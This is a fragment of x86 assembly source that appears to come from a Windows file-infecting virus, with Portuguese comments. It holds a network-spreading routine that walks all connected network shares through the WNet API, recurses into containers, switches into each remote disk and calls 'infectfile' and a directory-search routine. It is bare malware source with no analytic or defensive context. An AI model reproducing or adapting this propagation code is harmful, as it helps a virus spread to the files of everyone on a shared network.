IF DISKSEARCH EQ TRUE

net_thread:
       pushad
       call @@net_file_handler666
       jmp net_file_handler
  @@net_file_handler666:
       push 0
       call NetSearch
       popad
       ret 4

NetSearch:
       pushad

       push 0
       push esp
       push dwo [esp+8*4+4+2*4]
       push 0
       push RESOURCETYPE_ANY
       push RESOURCE_CONNECTED
       call [_WNetOpenEnumA]
       test eax, eax
       pop ebx
       jnz @@done

       push 16*1024h
       push 40h
       call [_GlobalAlloc]
       test eax, eax
       jz @@done1

       push eax
       mov esi, eax
       push -1
       mov ecx, esp
       push 16*1024
       push esp
       push esi
       push ecx
       push ebx
       call [_WNetEnumResourceA]
       test eax, eax
       pop edi
       pop edi
       jnz @@done2

  @@next_entry:
       test dwo [esi+dwType], RESOURCETYPE_DISK
       jz @@go_next_entry

       mov eax, [esi+lpLocalName]
       test eax, eax
       jz @@empty_name
       push dwo [esi+lpRemoteName]
       call [esp+8*4+8+8]
  @@empty_name:
       test dwo [esi+dwUsage], RESOURCEUSAGE_CONTAINER
       jz @@go_next_entry

       push dwo [esp+8*4+12]
       push esi
       call NetSearch

  @@go_next_entry:
       add esi, NETRESOURCE_size
       dec edi
       jnz @@next_entry
  @@done2:
       call [_GlobalFree]
  @@done1:
       push ebx
       call [_WNetCloseEnum]
  @@done:
       popad
       ret 8

net_file_handler:
       pushad
       push dwo [esp+8*4+4]
       call [_SetCurrentDirectoryA]
       test eax, eax
       jz @@done
       call @@infectfile666
       jmp infectfile
  @@infectfile666:
       call busca_disco                         ;busca dentro dos diretorios
  @@done:
       popad
       ret 4


dwScope       EQU 0
dwType        EQU 4
dwDisplayType EQU 8
dwUsage       EQU 12
lpLocalName   EQU 16
lpRemoteName  EQU 20
lpComment     EQU 24
lpProvider    EQU 28
NETRESOURCE_size EQU 32

RESOURCE_CONNECTED      EQU 00000001h
RESOURCETYPE_ANY        EQU 00000000h
RESOURCETYPE_DISK       EQU 00000001h
RESOURCEUSAGE_CONTAINER EQU 00000002h

ENDIF
